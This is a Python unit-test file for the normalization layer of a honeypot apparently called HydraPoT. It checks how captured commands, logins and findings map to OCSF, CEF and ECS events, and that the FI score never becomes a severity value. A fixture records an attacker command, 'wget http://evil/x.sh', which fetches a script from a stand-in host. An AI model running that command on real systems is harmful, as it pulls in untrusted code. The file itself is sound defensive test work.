"""
tests/test_normalize.py — the Normalization layer's contract.

Run:  python3 -m unittest discover -s tests -v     (from the repo root)

Normalization is the boundary where HydraPoT's internal shape becomes something
another vendor's tooling will act on. Two things must hold, and everything else
here exists to protect them:

  * FI NEVER BECOMES SECURITY SEVERITY. FI is HydraPoT's routing metric --
    it decides which agent answers a command. The previous CEF exporter mapped
    FI straight into the CEF severity column, so every downstream SIEM read a
    loud-but-harmless `rm` as severity 10. Tests below assert FI 0, 1 and 4 all
    produce identical severity.
  * NOTHING IS FABRICATED. A typed SSH command has no pid, no parent process
    and no exit code. Absent means "we do not know"; a zero would be a fact a
    SIEM would correlate on.

Class ids, activity ids and severity values are asserted against the values
published for the pinned OCSF version (normalize.OCSF_VERSION), so bumping the
pin without re-reading the schema fails here rather than silently shipping
mislabelled events.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from threat_intel import normalize as N  # noqa: E402


CMD = {"session_id": "s1", "src_ip": "1.2.3.4", "timestamp": "2026-01-01 00:00:00",
       "cmd": "wget http://evil/x.sh", "agent": "cloud", "fi_score": 4,
       "latency_ms": 2458.0, "instance": "sensor-a", "technique_id": "T1105",
       "technique": "Ingress Tool Transfer", "tactic": "Command and Control"}

AUTH = {"timestamp": "2026-01-01 00:00:05", "src_ip": "1.2.3.4", "src_port": 51234,
        "username": "root", "password": "hunter2", "auth_type": "password",
        "event": "login.failed", "instance": "sensor-a"}


def finding(severity="critical", state="new"):
    return ({"severity": severity,
             "severity_rules": [{"id": "payload-retrieve-and-execute"}],
             "rules": [{"id": "multi-tactic-shared-sequence",
                        "title": "Shared sequence spans several tactics",
                        "reason": "crosses tactics"}],
             "relationship": {
                 "link_type": "same_sequence", "link_value": "abc123",
                 "statement": "these sessions share an identical observed command sequence",
                 "members": ["s1", "s2"], "member_count": 22,
                 "distinct_sources": 1, "src_ips": ["1.2.3.4"],
                 "first_seen": "2019-08-05 05:46:52",
                 "last_seen": "2019-08-05 17:50:07", "scope": ["CyberLab"],
                 "evidence": {"technique_ids": ["T1105"],
                              "tactics": ["Command and Control"]}}},
            {"alert_key": "k1", "state": state, "severity": severity,
             "title": "Critical behaviour observed", "alert_rule": "critical-behaviour",
             "created_at": "2026-09-13 16:01:38", "last_seen": "2019-08-05 17:50:07"})


# ── FI is not severity ──────────────────────────────────────────────────────

class TestFiIsNeverSeverity(unittest.TestCase):
    """The single most consequential guarantee in this module."""

    def test_fi_does_not_change_ocsf_severity(self):
        sevs = {N.normalize_command(dict(CMD, fi_score=fi))["severity_id"]
                for fi in (0, 1, 2, 3, 4)}
        self.assertEqual(sevs, {N.SEVERITY_UNKNOWN},
                         "FI moved OCSF severity_id")

    def test_fi_does_not_change_cef_severity(self):
        """The exact bug that shipped: {0:1,1:3,2:5,3:7,4:10}.get(fi)."""
        sevs = {N.to_cef(N.normalize_command(dict(CMD, fi_score=fi))).split("|")[6]
                for fi in (0, 1, 2, 3, 4)}
        self.assertEqual(len(sevs), 1, f"CEF severity varies with FI: {sevs}")

    def test_fi_does_not_change_ecs_severity(self):
        sevs = {N.to_ecs(N.normalize_command(dict(CMD, fi_score=fi)))
                .get("event", {}).get("severity") for fi in (0, 1, 4)}
        self.assertEqual(len(sevs), 1)

    def test_fi_survives_as_namespaced_operational_metadata(self):
        """Not deleted — it is real and useful, just not a security rating."""
        for fi in (0, 4):
            ev = N.normalize_command(dict(CMD, fi_score=fi))
            self.assertEqual(ev["unmapped"]["hydrapot"]["fi_score"], fi)

    def test_fi_is_not_at_the_top_level_of_a_normalized_event(self):
        ev = N.normalize_command(CMD)
        for key in ("fi", "fi_score", "agent", "latency_ms"):
            self.assertNotIn(key, ev)

    def test_cef_carries_fi_as_a_labelled_custom_field(self):
        cef = N.to_cef(N.normalize_command(CMD))
        self.assertIn("cs3=4", cef)
        self.assertIn("cs3Label=HydraPoTFIScore", cef)

    def test_severity_comes_from_the_severity_layer_for_findings(self):
        for level, expected in (("info", 1), ("low", 2), ("medium", 3),
                                ("high", 4), ("critical", 5)):
            det, alert = finding(severity=level)
            self.assertEqual(N.normalize_finding(det, alert)["severity_id"],
                             expected)

    def test_unrated_finding_is_unknown_not_a_guess(self):
        det, alert = finding(severity=None)
        alert["severity"] = None
        self.assertEqual(N.normalize_finding(det, alert)["severity_id"],
                         N.SEVERITY_UNKNOWN)


# ── nothing is fabricated ───────────────────────────────────────────────────

class TestNoFabrication(unittest.TestCase):

    def test_command_carries_only_cmd_line_on_the_process_object(self):
        """A honeypot command is not an OS process. No pid, no parent, no exit
        code, no image path — those would be facts nobody measured."""
        p = N.normalize_command(CMD)["process"]
        self.assertEqual(set(p), {"cmd_line"})

    def test_no_process_tree_fields_anywhere(self):
        ev = N.normalize_command(CMD)
        flat = repr(ev)
        for banned in ("'pid'", "parent_process", "exit_code", "'ppid'"):
            self.assertNotIn(banned, flat)

    def test_absent_fields_are_omitted_not_nulled(self):
        """Absent means "we do not know"; null means "we looked and there was
        nothing". They are different claims."""
        ev = N.normalize_command({"cmd": "ls"})
        self.assertNotIn("src_endpoint", ev)
        self.assertIsNone(ev.get("time"))

    def test_unparseable_timestamp_does_not_become_now(self):
        ev = N.normalize_command(dict(CMD, timestamp="garbage"))
        self.assertNotIn("time", ev)
        self.assertEqual(ev["metadata"]["original_time"], "garbage")

    def test_password_is_never_exported(self):
        """Attacker-supplied credential material belongs in the local IOC
        store, not in a stream forwarded to third parties."""
        ev = N.normalize_auth(AUTH)
        self.assertNotIn("hunter2", repr(ev))


# ── OCSF conformance ────────────────────────────────────────────────────────

class TestOcsfShape(unittest.TestCase):

    def test_pinned_class_ids(self):
        self.assertEqual(N.CLASS_AUTHENTICATION, 3002)
        self.assertEqual(N.CLASS_PROCESS_ACTIVITY, 1007)
        self.assertEqual(N.CLASS_DETECTION_FINDING, 2004)

    def test_pinned_categories(self):
        self.assertEqual(N.CATEGORY[N.CLASS_AUTHENTICATION], 3)
        self.assertEqual(N.CATEGORY[N.CLASS_PROCESS_ACTIVITY], 1)
        self.assertEqual(N.CATEGORY[N.CLASS_DETECTION_FINDING], 2)

    def test_severity_ladder_matches_the_spec(self):
        self.assertEqual(N.SEVERITY_ID,
                         {"info": 1, "low": 2, "medium": 3, "high": 4,
                          "critical": 5})

    def test_type_uid_is_class_times_100_plus_activity(self):
        for ev in (N.normalize_command(CMD), N.normalize_auth(AUTH),
                   N.normalize_finding(*finding())):
            self.assertEqual(ev["type_uid"],
                             ev["class_uid"] * 100 + ev["activity_id"])

    def test_every_event_carries_the_required_base_attributes(self):
        for ev in (N.normalize_command(CMD), N.normalize_auth(AUTH),
                   N.normalize_finding(*finding())):
            for attr in ("class_uid", "category_uid", "activity_id",
                         "type_uid", "severity_id", "time", "metadata"):
                self.assertIn(attr, ev)
            self.assertEqual(ev["metadata"]["version"], N.OCSF_VERSION)

    def test_custom_fields_use_ocsf_unmapped_not_an_invented_extension(self):
        ev = N.normalize_command(CMD)
        self.assertIn("unmapped", ev)
        self.assertIn("hydrapot", ev["unmapped"])


class TestCommand(unittest.TestCase):

    def test_is_process_activity_launch(self):
        ev = N.normalize_command(CMD)
        self.assertEqual(ev["class_uid"], N.CLASS_PROCESS_ACTIVITY)
        self.assertEqual(ev["activity_id"], N.PROCESS_LAUNCH)

    def test_maps_the_fields_we_actually_have(self):
        ev = N.normalize_command(CMD)
        self.assertEqual(ev["process"]["cmd_line"], CMD["cmd"])
        self.assertEqual(ev["src_endpoint"]["ip"], "1.2.3.4")
        self.assertEqual(ev["actor"]["session"]["uid"], "s1")
        self.assertEqual(ev["device"]["hostname"], "sensor-a")

    def test_mitre_goes_into_attacks(self):
        attacks = N.normalize_command(CMD)["attacks"]
        self.assertIn("T1105", [a.get("technique", {}).get("uid") for a in attacks])
        self.assertIn("Command and Control",
                      [a.get("tactic", {}).get("name") for a in attacks])

    def test_untagged_command_has_no_attacks_key(self):
        ev = N.normalize_command({k: v for k, v in CMD.items()
                                  if k not in ("technique_id", "tactic", "technique")})
        self.assertNotIn("attacks", ev)

    def test_empty_input_does_not_raise(self):
        for bad in ({}, None):
            ev = N.normalize_command(bad)
            self.assertEqual(ev["class_uid"], N.CLASS_PROCESS_ACTIVITY)


class TestAuth(unittest.TestCase):

    def test_is_authentication_logon(self):
        ev = N.normalize_auth(AUTH)
        self.assertEqual(ev["class_uid"], N.CLASS_AUTHENTICATION)
        self.assertEqual(ev["activity_id"], N.AUTH_LOGON)

    def test_status_maps_from_the_event_string(self):
        self.assertEqual(N.normalize_auth(dict(AUTH, event="login.success"))["status_id"],
                         N.STATUS_SUCCESS)
        self.assertEqual(N.normalize_auth(dict(AUTH, event="login.failed"))["status_id"],
                         N.STATUS_FAILURE)
        self.assertEqual(N.normalize_auth(dict(AUTH, event="connection",
                                               auth_type="tcp_connect"))["status_id"],
                         N.STATUS_UNKNOWN)

    def test_tcp_probe_is_not_inflated_into_a_logon(self):
        """A bare TCP connect is not an authentication attempt, and reporting
        it as one would inflate every login-failure dashboard downstream."""
        ev = N.normalize_auth({"auth_type": "tcp_connect", "event": "connection",
                               "src_ip": "9.9.9.9", "timestamp": "2026-01-01 00:00:00"})
        self.assertEqual(ev["activity_id"], N.AUTH_UNKNOWN)

    def test_user_and_endpoint(self):
        ev = N.normalize_auth(AUTH)
        self.assertEqual(ev["user"]["name"], "root")
        self.assertEqual(ev["src_endpoint"]["port"], 51234)


class TestFinding(unittest.TestCase):

    def test_is_detection_finding(self):
        ev = N.normalize_finding(*finding())
        self.assertEqual(ev["class_uid"], N.CLASS_DETECTION_FINDING)

    def test_alert_state_maps_to_activity(self):
        for state, expected in (("new", N.FINDING_CREATE),
                                ("acknowledged", N.FINDING_UPDATE),
                                ("closed", N.FINDING_CLOSE)):
            ev = N.normalize_finding(*finding(state=state))
            self.assertEqual(ev["activity_id"], expected)

    def test_carries_the_correlation_statement_verbatim(self):
        """The engine's own wording is the only sentence it authorises a
        consumer to render for a relationship."""
        det, alert = finding()
        ev = N.normalize_finding(det, alert)
        self.assertEqual(ev["finding_info"]["desc"],
                         det["relationship"]["statement"])

    def test_identity_is_stable_across_calls(self):
        det, alert = finding()
        self.assertEqual(N.normalize_finding(det, alert)["finding_info"]["uid"],
                         N.normalize_finding(det, alert)["finding_info"]["uid"])

    def test_identity_falls_back_to_the_alert_key_algorithm(self):
        """A finding exported before an alert record exists must match the one
        exported after it."""
        det, alert = finding()
        from threat_intel.alert_records import alert_key
        self.assertEqual(N.normalize_finding(det)["finding_info"]["uid"],
                         alert_key(det))

    def test_correlation_and_detection_detail_stay_namespaced(self):
        ev = N.normalize_finding(*finding())
        hp = ev["unmapped"]["hydrapot"]
        self.assertEqual(hp["link_type"], "same_sequence")
        self.assertEqual(hp["member_count"], 22)
        self.assertEqual(hp["detection_rule"], "multi-tactic-shared-sequence")

    def test_member_sessions_become_evidences(self):
        ev = N.normalize_finding(*finding())
        self.assertEqual([e["session"]["uid"] for e in ev["evidences"]],
                         ["s1", "s2"])

    def test_evidences_are_capped(self):
        det, alert = finding()
        det["relationship"]["members"] = [f"s{i}" for i in range(500)]
        self.assertLessEqual(len(N.normalize_finding(det, alert)["evidences"]), 20)


class TestDeterminism(unittest.TestCase):

    def test_same_input_always_yields_the_same_output(self):
        """No clock reads, no randomness — which is what makes the exporters
        testable and a diff of two exports meaningful."""
        for fn, arg in ((N.normalize_command, CMD), (N.normalize_auth, AUTH)):
            self.assertEqual(fn(arg), fn(arg))
        det, alert = finding()
        self.assertEqual(N.normalize_finding(det, alert),
                         N.normalize_finding(det, alert))

    def test_input_is_not_mutated(self):
        snapshot = dict(CMD)
        N.normalize_command(CMD)
        self.assertEqual(CMD, snapshot)


# ── exporter adapters ───────────────────────────────────────────────────────

class TestCef(unittest.TestCase):

    def test_header_has_the_seven_cef_fields(self):
        cef = N.to_cef(N.normalize_command(CMD))
        self.assertTrue(cef.startswith("CEF:0|HydraPoT|Honeypot|1.0|"))
        self.assertGreaterEqual(len(cef.split("|")), 8)

    def test_finding_severity_reaches_the_cef_severity_column(self):
        det, alert = finding(severity="critical")
        self.assertEqual(N.to_cef(N.normalize_finding(det, alert)).split("|")[6], "10")
        det, alert = finding(severity="low")
        self.assertEqual(N.to_cef(N.normalize_finding(det, alert)).split("|")[6], "3")

    def test_raw_event_gets_cef_unknown_severity(self):
        self.assertEqual(N.to_cef(N.normalize_command(CMD)).split("|")[6], "0")

    def test_extension_values_are_escaped(self):
        ev = N.normalize_command(dict(CMD, cmd="a=b|c\\d"))
        body = N.to_cef(ev).split("|", 7)[7]
        self.assertIn("\\=", body)
        self.assertNotIn("\n", N.to_cef(ev))

    def test_custom_slots_are_labelled(self):
        cef = N.to_cef(N.normalize_command(CMD))
        for n in (1, 2, 3):
            if f"cs{n}=" in cef:
                self.assertIn(f"cs{n}Label=", cef)


class TestEcs(unittest.TestCase):

    def test_core_ecs_fields(self):
        ecs = N.to_ecs(N.normalize_command(CMD))
        self.assertEqual(ecs["source"]["ip"], "1.2.3.4")
        self.assertEqual(ecs["process"]["command_line"], CMD["cmd"])
        self.assertEqual(ecs["host"]["name"], "sensor-a")
        self.assertTrue(ecs["@timestamp"].endswith("Z"))

    def test_event_categorisation(self):
        self.assertEqual(N.to_ecs(N.normalize_command(CMD))["event"]["category"],
                         ["process"])
        self.assertEqual(N.to_ecs(N.normalize_auth(AUTH))["event"]["category"],
                         ["authentication"])
        ecs = N.to_ecs(N.normalize_finding(*finding()))
        self.assertEqual(ecs["event"]["kind"], "alert")

    def test_every_ecs_document_declares_the_schema_version(self):
        """Tooling that auto-detects "is this ECS?" checks ecs.version first."""
        for ev in (N.normalize_command(CMD), N.normalize_auth(AUTH),
                   N.normalize_finding(*finding())):
            self.assertEqual(N.to_ecs(ev)["ecs"]["version"], N.ECS_VERSION)

    def test_event_type_accompanies_every_category(self):
        """ECS treats category and type as a pair; category alone leaves a
        document half-classified and invisible to rules that filter on both."""
        for ev in (N.normalize_command(CMD), N.normalize_auth(AUTH),
                   N.normalize_finding(*finding())):
            ecs = N.to_ecs(ev)
            self.assertIn("type", ecs["event"], ecs["event"])
            self.assertIsInstance(ecs["event"]["type"], list)

    def test_a_command_launch_is_typed_start(self):
        self.assertEqual(N.to_ecs(N.normalize_command(CMD))["event"]["type"],
                         ["start"])

    def test_a_logon_is_a_session_start_but_a_bare_tcp_probe_is_not(self):
        """normalize_auth refuses to inflate a TCP connect into a logon; the
        ECS mapping must not undo that at the boundary."""
        self.assertEqual(N.to_ecs(N.normalize_auth(AUTH))["event"]["type"],
                         ["start"])
        probe = N.normalize_auth({"auth_type": "tcp_connect",
                                  "event": "connection", "src_ip": "1.2.3.4"})
        self.assertEqual(N.to_ecs(probe)["event"]["type"], ["info"])

    def test_severity_is_rescaled_to_the_ecs_0_100_range(self):
        """Copying OCSF's 0-5 straight across would read as "almost nothing"
        in Kibana."""
        ecs = N.to_ecs(N.normalize_finding(*finding(severity="critical")))
        self.assertEqual(ecs["event"]["severity"], 99)

    def test_mitre_uses_the_ecs_threat_fields(self):
        ecs = N.to_ecs(N.normalize_command(CMD))
        self.assertEqual(ecs["threat"]["framework"], "MITRE ATT&CK")
        self.assertIn("T1105", ecs["threat"]["technique"]["id"])

    def test_operational_metrics_stay_namespaced_in_ecs_too(self):
        ecs = N.to_ecs(N.normalize_command(CMD))
        self.assertEqual(ecs["hydrapot"]["fi_score"], 4)
        self.assertNotIn("severity", ecs["hydrapot"])


class TestJson(unittest.TestCase):

    def test_json_is_the_canonical_event_unchanged(self):
        ev = N.normalize_command(CMD)
        self.assertIs(N.to_json(ev), ev)

    def test_canonical_event_is_json_serialisable(self):
        import json
        for ev in (N.normalize_command(CMD), N.normalize_auth(AUTH),
                   N.normalize_finding(*finding())):
            json.loads(json.dumps(ev))


if __name__ == "__main__":
    unittest.main(verbosity=2)
